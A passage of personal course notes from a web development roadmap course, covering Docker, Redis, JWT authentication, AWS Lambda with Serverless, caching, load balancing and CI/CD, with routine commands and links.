- [`bin/bash`](https://unix.stackexchange.com/questions/398543/what-are-the-contents-of-bin-bash-and-what-do-i-do-if-i-accidentally-overwrote)
- RUN: execute and stack image in docker container
- CMD: exexute when enter docker container, only one CMD
- Outside host cannot access to container by default
- Port binding

**[⬆ back to top](#table-of-contents)**

### [Docker Commands](https://docs.docker.com/engine/reference/builder/#usage)
- Build Server Image: `docker build -t smartbrainservercontainer .`
- Build Client Image: `docker build -t smartbrainclientcontainer .`
- Run and Enter container: `docker run -it smartbrainservercontainer`
- Run container in the background: `docker run -it -d smartbrainservercontainer`
- List all container: `docker ps`
- Enter a container running in background: `docker exec -it 7464fd583963 bash`
- Stop running container: `docker stop 7464fd583963`
- Port forwarding: `docker run -it -p 3000:3000 smartbrainservercontainer`
- [The Ultimate Docker Cheat Sheet](http://dockerlabs.collabnix.com/docker/cheatsheet/)

**[⬆ back to top](#table-of-contents)**

### Docker Compose
- is a tool for defining and running multi-container Docker applications.
- edit docker-compose.yml
- Shutdown: `docker-compose down`
- Build container and run all services: `docker-compose up --build`
- Build container: `docker-compose build`
- Run all services in background: `docker-compose up -d`
- Run a specific service: `docker-compose run --service-ports smart-brain-api`
- Run a specific service and enter bash: `docker-compose exec smart-brain-api bash`
- [docker-compose build](https://docs.docker.com/compose/reference/build/)
- [docker-compose run](https://docs.docker.com/compose/reference/run/)
- [docker-compose up](https://docs.docker.com/compose/reference/up/)
- [What is the purpose of VOLUME in Dockerfile](https://stackoverflow.com/questions/34809646/what-is-the-purpose-of-volume-in-dockerfile)
- [Docker Volumes and Networks with Compose](https://www.linux.com/topic/cloud/docker-volumes-and-networks-compose/)

**[⬆ back to top](#table-of-contents)**

### PostgreSQL With Docker
- [postgres](https://hub.docker.com/_/postgres/)
- [psql](https://www.postgresql.org/docs/9.2/app-psql.html)
- [Getting Started with PostgreSQL on Mac OSX](https://www.codementor.io/engineerapart/getting-started-with-postgresql-on-mac-osx-are8jcopb)
- [How to Create Tables and Insert Data into SQL Databases](http://joshualande.com/create-tables-sql)

**[⬆ back to top](#table-of-contents)**

### Docker Networks
- [docker network create](https://docs.docker.com/engine/reference/commandline/network_create/)
- [Networking in Compose](https://docs.docker.com/compose/networking/)
- [docker-compose: difference between network and link](https://stackoverflow.com/questions/41294305/docker-compose-difference-between-network-and-link)

**[⬆ back to top](#table-of-contents)**

## **Section 12: Redis**

- [Redis](https://redis.io/) NoSQL in memory database
- Use for short live data, e.g. sessions, web page headcount
- Redis take a snapshot and store on disk
- NoSQL Databases
  - Key - Value: redis
  - Document: mongoDB, CouchDB
  - Wide Column: cassandra
  - Graph: neo4j
- RelationalDB (SQL)
  - users.txt
  - tweets.txt
  - profile.txt
  - following.txt
- MongoDB (MongoDB query)
  - users1.txt
  - users2.txt
  - users3.txt
- [SQL vs. NoSQL Databases: What’s the Difference?](https://www.upwork.com/hiring/data/sql-vs-nosql-databases-whats-the-difference/)
- [Installing Redis](https://redis.io/download)
- [Redis Quick Start](https://redis.io/topics/quickstart)
- [Issue with Redis install](https://stackoverflow.com/questions/8131008/issue-with-redis-install)
- [Redis Installation fails when running make command](https://stackoverflow.com/questions/37103054/redis-installation-fails-when-running-make-command)
- [Try Redis](http://try.redis.io/)
- [Redis Commands](https://redis.io/commands)
  - Set key-value: `set name jane`
  - Get value by key: `get name`
  - Check key exists: `exists name`
  - Delete key: `del name`
  - Set key to expire in 10s: `expire name 10`
  - Set key-value: `set counter 1000`
  - Increment counter by 33: `incrby counter 33`
  - Decrement counter by 1: `decr counter`
- [Redis Data Types](https://redis.io/topics/data-types-intro)
  - Set multiples key-value: `mset a 2 b 5`
  - Get multiples key-value: `mget a b`
  - Redis Hashes - similar to object
    - Set hash with key-values: `hmset user id 45 name "Jonny"`
    - Get hash with key: `hget user id`
    - Get hash with key: `hget user name`
    - Get all keys and values: `hgetall user`
  - Redis Lists - similar to linked lists
    - Push 10 to the list from left: `lpush ourlist 10`
    - Push Hello to the list from right: `rpush ourlist "hello"`
    - Show 2 items in list from left: `lrange ourlist 0 1`
    - Pop the list from right: `rpop ourlist`
  - Redis Sets + sorted sets - data is unique
    - Set key and score member: `zadd team 50 "Wizard"`
    - Set key and score member: `zadd team 40 "Cavalier"`
    - Show 2 items in set from left: `zrange team 0 1`
    - Set key and score member: `zadd team 1 "Bolts"`
    - Show 2 items in set from left: `zrange team 0 2`
    - Get item position in: `zrank team "Wizard"`

**[⬆ back to top](#table-of-contents)**

## **Section 13: JWT + Sessions**

- [Cookie vs. Token Authentication](https://dzone.com/articles/cookies-vs-tokens-the-definitive-guide)
- Cookie is stateful. Need to store in database to track
- Token is stateless. Don't need to store in database
- Token is stateless. Browser will destroy the token when user sign out
  - Pro: Stateless. Backend can check validity
  - Pro: Can store user info in token
  - Pro: Easy to work with different APIs
  - Pro: Can serve both browser and mobile platform
  - Con: Size of JWT is larger than cookie
  - Con: Stolen JWT can decode to see info in JWT
- [Token Authentication vs. Cookies](https://stackoverflow.com/questions/17000835/token-authentication-vs-cookies)
- [Why JWTs Suck as Session Tokens](https://scotch.io/bar-talk/why-jwts-suck-as-session-tokens)
- What We Are Building
  - JWT token
    - /signin -> Username / Password -> server
    - client <- JWT token <- server
    - /profile/23 -> token in authorisation header -> server
    - client <- package <- server
  - Cookie
    - /signin -> Username / Password -> server
    - client <- Cookie <- server
    - /profile/23 -> cookie -> server <-> redis
    - client <- package <- server
  - JWT token Improved
    - /signin -> Username / Password -> server
    - client <- JWT token <- server
    - /profile/23 -> token in authorisation header -> server <-> redis
    - client <- package <- server

![](jwt.jpg)

- [JWT](https://jwt.io/)
  - Meaning information in JWT Payload
  - [jsonwebtoken](https://github.com/auth0/node-jsonwebtoken)
    - Sign: `var token = jwt.sign({ foo: 'bar' }, 'shhhhh');`
    - Verify: `var decoded = jwt.verify(token, 'shhhhh');`
- Project Goals
  - Add requireAuth before access backend service
- Profile Icon
  - [Tachyons](https://tachyons.io/)
  - [reactstrap](https://reactstrap.github.io/)
- [HTML entities](http://www.w3schools.com/charsets/ref_html_entities_4.asp)
- Updating Profile
  - [Knex.js](https://knexjs.org/)
  - [Postman](https://www.postman.com/)
- Sending The JWT Token
  - [jsonwebtoken](https://github.com/auth0/node-jsonwebtoken)
- Adding Redis
  - [Node Redis](https://github.com/NodeRedis/node-redis)
  - [Best JavaScript code snippets using redis.RedisClient](https://www.codota.com/code/javascript/classes/redis/RedisClient)
  - Shutdown docker container: `docker-compose down`
  - Build and Start docker container: `docker-compose up --build`
  - Start docker container: `docker-compose up`
  - Connect redis client to redis server in docker container: `docker-compose exec redis redis-cli`
  - set token id: `set ayJhbGciOiJIUzI1NiIseyJlbWFpbCI6InRpbUBnbWFpbC5jb20iLCJpYXQimV4cCI6MTU4ODk5MTU2N30.INBo55fz0JZRds0aXqs3LeGD4I 3`
  - get token: `get ayJhbGciOiJIUzI1NiIseyJlbWFpbCI6InRpbUBnbWFpbC5jb20iLCJpYXQimV4cCI6MTU4ODk5MTU2N30.INBo55fz0JZRds0aXqs3LeGD4I`
- User authentication process with email and password (first time)
  - User Signin: Client [{ email, password }] => Backend API
  - Backend Sign Token: Client - Backend API [token = jwt.sign({ email }, JWT_SECRET)]
  - Redis Store Token: Client - Backend API [redisClient.set(token, id)] => Redis
  - Client Receive token: Client [{ success, userId, token }] <= Backend API - Redis
  - Client save Auth Token In Session: Client [window.sessionStorage.setItem('token', token)] - Server - Redis
    - sessionStorage: session for single browser tab
    - localStorage: session for multiple browser tabs
- User authentication process with token (refresh browser)
  - User refresh browser: Client [req = { headers: { 'Authorization': token } } ] => Backend API
  - Backend Get Id from Auth Token : Client - Backend API [redisClient.get(token)] => Redis
  - Redis pass id to Backend: Client - Backend API <= Redis [id]
  - Client Receive id: Client [id] <= Backend API - Redis
- Bearer Token
  - [Refresh Tokens: When to Use Them and How They Interact with JWTs](https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/)
  - [Why is 'Bearer' required before the token in 'Authorization' header in a HTTP request?](https://security.stackexchange.com/questions/108662/why-is-bearer-required-before-the-token-in-authorization-header-in-a-http-re)
- Middleware
  - case that we always need to act up request
  - Authorization Middleware: check for Authorization header in request
    - No Authorization header -> response status 401
    - Get User Id from redis with token
      - No User Id or null -> response status 401
    - Pass request to next middleware
- Updating our App
  - Update Dockerfile
  - Update docker-compose.yml
  - Update package.json

**[⬆ back to top](#table-of-contents)**

## **Section 14: AWS**

Amazon Web Services

- [AWS](https://aws.amazon.com/)
  - EC2: Virtual Servers in the Cloud
  - S3: Scalable Storage in the Cloud
  - Lambda: Run Code without Thinking about Servers
  - CloudFront: Global Content Delivery Network
  - DynamoDB: Managed NoSQL Database
  - Google Amazon flow
  - Example: Smart Brain App
    - CloudFront: serve static Smart Brain frontend files
    - EC2: Smart Brain backend rest API
    - DynamoDB: store user info, user profile
    - Lambda: take image url from EC2 and send to clarify
    - Lambda: store clarify response in S3
    - S3: return respose from clarify to EC2
- Monolithic vs Micro Services
  - Monolithic: all services must be tested before deploy to production
  - Micro Services: small chunks can be tested individually
- Amazon Lambda - stateless
  - function is only run when trigger
  - no cost if the function is not trigger
  - AWS Management Console
    - Find services: Lambda
    - Create function
    - Enter function name, select Runtime and Permissions
- Amazon Lambda Dashboard
  - [AWS Free Tier](https://aws.amazon.com/free)
- IAM - Manage access to AWS resources
  - Users: Add user with Programmatic access
  - Set permissions: AdministratorAccess (for development only)
  - Get Access key ID and Secret access key
  - [Managing IAM Policies](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_manage.html)
  - [IAM](https://www.serverless.com/framework/docs/providers/aws/guide/iam/)
- [Serverless](https://www.serverless.com/)
  - Create Lambda function with Serverless
  - Get Help: `serverless --help`
  - Get Help on specific command: `serverless create --help`
  - Shorthand: `sls --help`
  - Create a new Serverless preoject: `sls create -t aws-nodejs`
  - Connect AWS account to serverless framework with IAM: `sls config credentials --provider aws --key <Access key ID> --secret <Secret access key>`
    - Goto cd ~/.aws
    - check credentials has Access key ID and Secret access key
  - Deploy to Lambda: `sls deploy`
  - Invoke Lambda function: `sls invoke --function rank`
  - Invoke Lambda function locally: `sls invoke local --function rank`
  - Specifies that the rank function should be run when someone accesses the API gateway at rank via a GET request.

```
functions:
  rank:
    handler: handler.rank
    events:
      - http:
          path: rank
          method: get
```

**[⬆ back to top](#table-of-contents)**

## **Section 15: Performance Part 3**

- CDNs
  - [What is a CDN?](https://www.cloudflare.com/learning/cdn/what-is-a-cdn/)
  - [What is a CDN edge server?](https://www.cloudflare.com/learning/cdn/glossary/edge-server/)
  - [The Cloudflare Global Anycast Network](https://www.cloudflare.com/network/)
  - [Amazon CloudFront](https://aws.amazon.com/cloudfront/)
  - [Content Delivery Network](https://azure.microsoft.com/en-us/services/cdn/)
- [GZIP Compression](https://www.cdnplanet.com/guides/compression/)
  - [compression](https://github.com/expressjs/compression)
  - Check Response Headers: `content-encoding: gzip`
  - [nginx](https://docs.nginx.com/nginx/admin-guide/web-server/compression/)
- [Brotli compression format](https://github.com/google/brotli)
  - Check Response Headers: `content-encoding: br`
- Database Scaling
  - Identify Inefficient Queries
    - Do not have too many joints
    - Ask for required information only
    - Use indexes - `CREATE INDEX idx_name ON table_name (column_name);`
    - Storage is the slowest piece in a relational database
    - Inefficient Query can cause a huge amount of delay
  - Increase Memory
    - Store more information in memory
  - Vertical Scaling (Redis, Memchached)
    - Add another service so that your system effectively uses the resources better
    - Add another server that is a memory storage which makes things fast means that we've just increased the memory of our database
    - Check Redis first before asking the database
    - Database response will cache in Redis
    - Use memory access instead of disk access
  - Sharding
    - break down the data into different places
      - one database store age > 30
      - another database store age <=30
  - More Databases
    - Distribute request load to different database
    - Place a load balancer in front of all databases to distribute the load
  - [Database Type](https://stackoverflow.com/questions/33760290/how-many-types-of-database-are-there)
    - decide what type of characteristics or behaviors do we want to out of the database
- Caching
  - CPU - register (cache) <=> RAM - memory <=> HDD
  - Cache HTML, CSS and JS files in CDN
  - Cache API response in Database, Redis or variable
  - Cache in the browser
    - Convert web app into PWA app
    - Cache HTML, CSS and JS files in Application tab - Cache
    - Check Network tab - Size: (from ServiceWorker)
    - memory cache
    - disk cache
    - How to update cache?
      - Cache will update if see different ETag
      - [cache busting](What Is Cache Busting?)
    - [HTTP Cache](https://web.dev/http-cache/)
    - Response header
      - Content-Length: 1024
      - Cache-Control: public, max-age=7200
      - ETag: W/"ca-171f45c4838"
    - `http://localhost:3000/static/`
      - First time load: Status - 200, Size - 531 Bytes
      - Next time load: Status - [304](https://www.keycdn.com/support/304-not-modified), Size - 276 Bytes
      - First time load in a new tab: Status - 200, Size - (disk cache)
  - [Caching Everywhere](https://www.freecodecamp.org/news/the-hidden-components-of-web-caching-970854fe2c49/)
  - [Cache Headers](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching)
  - [Caching and Performance](https://devcenter.heroku.com/articles/increasing-application-performance-with-http-cache-headers)
- Load Balancing
  - Case 1: Little user
    - Client <-> Server [Serve HTML, CS, JS]
    - Client <-> Server [Apache, Nginx]
  - Case 2: More users
    - Use Nginx as a [reverse proxy server](https://www.nginx.com/resources/glossary/reverse-proxy-server/)
    - Client [SPA] -> Nginx [Load Balancer] -> Server 1 [NodeJs]
    - Client [SPA] -> Nginx [Load Balancer] -> Server 2 [NodeJs]
    - Client [SPA] -> Nginx [Load Balancer] -> Server 3 [NodeJs]
  - Case 3: More users
    - Client [SPA] -> CDN [Serve HTML, CS, JS]
    - Client [SPA] -> Nginx [API Request]
    - Client [SPA] -> Nginx [Load Balancer] -> Server 1 [NodeJs]
    - Client [SPA] -> Nginx [Load Balancer] -> Server 2 [NodeJs]
    - Client [SPA] -> Nginx [Load Balancer] -> Server 3 [NodeJs]
  - [An Introduction to HAProxy and Load Balancing Concepts](https://www.digitalocean.com/community/tutorials/an-introduction-to-haproxy-and-load-balancing-concepts)
  - [Load balancing](https://www.digitalocean.com/products/load-balancer/)
  - [Elastic Load Balancing](https://aws.amazon.com/elasticloadbalancing/)
  - [Docker Tips : about /var/run/docker.sock](https://medium.com/better-programming/about-var-run-docker-sock-3bfd276e12fd)
  - Nginx
    - [nginx documentation](https://nginx.org/en/docs/)
    - [How to Configure NGINX](https://www.linode.com/docs/web-servers/nginx/how-to-configure-nginx/)
  - [loadtest](https://github.com/alexfernandez/loadtest)
  - [Artillery](https://artillery.io/)
  - [Siege](https://github.com/JoeDog/siege)

**[⬆ back to top](#table-of-contents)**

## **Section 16: CI/CD**

- Continuous Integration, Delivery, Deployment
  - Continuous Integration: Code PR -> Tests -> Build -> Merge
  - Continuous Delivery: Acceptance -> Manual -> Deploy
  - Continuous Deployment: Acceptance -> Auto -> Deploy
- Continuous Integration
  - Developers integrate code into a shared repository frequently
  - Each integration is verified by an automated build and automated tests
  - Each pull requests of a bug fix or a new feature must go through an automatic build step to make sure that all our unit tests pass
  - Make sure the code is compatible with the rest of the codebase
  - One of the key benefits of integrating regularly is that you can detect errors quickly and locate them more easily because each change that is introduced is going to be small and it's going to pinpoint the specific change that introduce a defect
  - If we make a PR, we run the tests and those tests fail. We know right away that that PR needs to get fixed.
  - Even after the PR is merged and a bug suddenly appears, we know that this PR most likely did it because it was recently introduced
  - The point is for companies to make sure that code from many developers has as little as possible bugs and that it stays consistent as much as possible
  - This process makes sure that code of the individual developers meet a certain standard and that this way no matter how big our teams we can make sure that individual developers work don't divert from the original codebase
  - We keep things in check and continuous integration is that when you combine the process of making a PR frequently with automated testing and building and then other developers checking the PR and then finally merging it
  - By doing this you avoid the integration hell that usually happens when people wait for release day to merge everything
- Continuous Delivery
  - The practice of keeping your code base deployable at any point
  - We need all the configurations necessary to push in production whenever we want continuous delivery
  - It is the idea that we're always going to keep things ready so that when we want a delivery product deployed to production 
  - There is an update to our product. We have this extra step of acceptance tests. We want this feature to do this and a QA analyst or a product owner checks to make sure that all the features are implemented and then manually a developer or a team lead clicks on a button that says deploy to production
  - Continuous delivery is an extension of continuous integration to make sure that you can release new changes to your customers quickly in a sustainable way
  - This means that on top of having automated your testing you also have to automate the release process so that you can deploy your production at any point in time
  - In theory with continuous delivery delivery process in your company you can decide to release daily weekly every night or whatever suits your business requirement.
- Continuous Deployment
  - Keep your application deployable at any point in time
  - Automatically deploy to production if acceptant tests are automatically passed
- Why learn? 
  - It's because continuous deployment and continuous delivery have developed as best practices for keeping our application in a good state in a deployable state at any point.
  - Every change that passes all stages of your production what we call pipeline this process is released to your customers
  - There's no human intervention and only a failed to test will prevent a new change to be deployed to production
  - In the long run as the team grows they'll have less bugs and more manageable code
- Building Great Software
  - Project setup: decide on the folder structure
  - Build steps: setup webpack or use create-react-app
  - Continuous Integration setup:  
  - Expand to continuous delivery and deployment 
  - Before: Code -> Github -> Code Review -> Merge
- Continuous Integration tools
  - Code -> Tests, Lint, Typescript -> Prettier -> Github -> circleci -> Code Review -> Merge
  - How CI tools works? 
    - A CI server that runs your continuous integration or continuous delivery
    - When you make a PR, the CI server know we just have a pool request and run all the unit tests, make sure everything passes and build the project
    - If nothing fails in that step everything is good to go
    - This PR is valid
    - You can now do a code review and somebody can do a final check on the code and then people can merge it
    - So we're adding this extra step over here or an extra machine that's going to do some work for us automatically every time we make a PR and circle CI is a software as a service solution
  - [Top 8 Continuous Integration Tools](https://code-maze.com/top-8-continuous-integration-tools/)
  - TravisCI or CircleCI for hosted CI servers. 
  - Jenkins for your own managed CI servers.
    - [circleci](https://circleci.com/)
    - [Travis CI](https://travis-ci.org/)
    - [Jenkins](https://www.jenkins.io/)
    - [TeamCity](https://www.jetbrains.com/teamcity/)
    - [Bamboo](https://www.atlassian.com/software/bamboo)
    - [GitLab](https://about.gitlab.com/)
    - [Buddy](https://buddy.works/)
  - [Prettier](https://prettier.io/)
    - [Option 2. pretty-quick](https://prettier.io/docs/en/precommit.html)
  - [Webpack Bundle Analyzer](https://github.com/webpack-contrib/webpack-bundle-analyzer)
  - [Storing Build Artifacts](https://circleci.com/docs/2.0/artifacts/)
  - [CircleCI Exercise](https://github.com/chesterheng/robofriends-testing)
- Code -> Tests, Lint, Typescript -> Prettier -> Github -> circleci -> Code Review -> Merge
- Deploy to Staging [process.env=staging]-> Acceptance Test -> Deploy to Production [process.env=production] -> [Smoke Test](https://www.freecodecamp.org/news/smoke-testing/)

**[⬆ back to top](#table-of-contents)**

## **Section 17: Extra Bits**

- Section Overview
- Complexity vs Simplicity
  - Choose Simplicity over Complexity
  - Create code of good quality
  - Good code is self documented
  - Good code minimise bug
  - Minimise complexity as much as you can
  - What can I do to make this code easy to understand?
- NPM Is Not Your Friend
  - Most react library is written as class component
  - Take the library src and refactor to functional component if possible
  - Check library size
- Learn To Learn
- Start With Why
  - Tools come and go
  - Fundamental: computer science topics
  - Fundamental: software development practices
  - Why this solution was created?
  - What problem is it solving?
  - Why is this the answer to my problem?
  - Understand the why of each library and what problems they solve?
  - Understand the big picture
  - Be the observer not the hamster
  - See the entire ecosystem and make smart decision
- Endorsements On LinkedIN

**[⬆ back to top](#table-of-contents)**

## **Section 20: Bonus: AMA Video!**

- Machine Learning and Business Analysis
- Business Data, Data Analysis
- Developer lifecycle
  - Learning to code, who to ask, what course to take
  - Imposter Syndrome, don't know enough
  - Lead project, do not get to god complex
    - understand pro and con based on the situation
    - open to suggestions
- Use code to automate a repeating task in mylife
- Pick a tech stack to finish and deliver fast
- Gain valuable experience to work with tech team in company
- Freelancing with an established client based
- Freelancing with a niche and rare skill
- Look at hot and trendy technology
- Selective in what you learn - 20/80
- Start from Why?

**[⬆ back to top](#table-of-contents)**

# The Complete Junior to Senior Web Developer Roadmap

Become a Fullstack Web Developer by learning the most in demand skills! Graduates of this course are now working at companies like Google, Tesla, Amazon, Apple, Shopify, JP Morgan, Facebook + other top tech companies (...seriously).

Join a live online community of over 400,000+ developers and a course taught by an industry expert that has actually worked in Lazada Philippines as a Senior Developer and Tech Lead.

Become a modern web developer. It doesn’t just cover a small portion of the industry. This covers everything you need to know to get hired: from absolute zero knowledge to being able to put things on your resume that will allow you to live the life you want.

Students have commented how the projects in this course have impressed their interviewers and allowed them to get an offer.

I'm a software developer who has worked directly with these technologies.  I love programming and believe that there needs to be a course out there that actually teaches valuable real life skills (because most of them are taught by teachers with no work experience).

I have taken the best pieces, tools, and practices that I have found over the years, and condensed everything.

### References
[How to Start as a Freelance Web Developer – Junior to Senior Roadmap](https://www.alardosa.com/how-to-start-as-a-freelance-web-developer/)

[The Complete Junior to Senior Web Developer Roadmap](https://www.udemy.com/course/the-complete-junior-to-senior-web-developer-roadmap/)

## Contact
You can send me a note on Linkedin [@alardosa](https://www.linkedin.com/in/alardosa/)

or visit my website at:

[www.alardosa.com](https://www.alardosa.com)
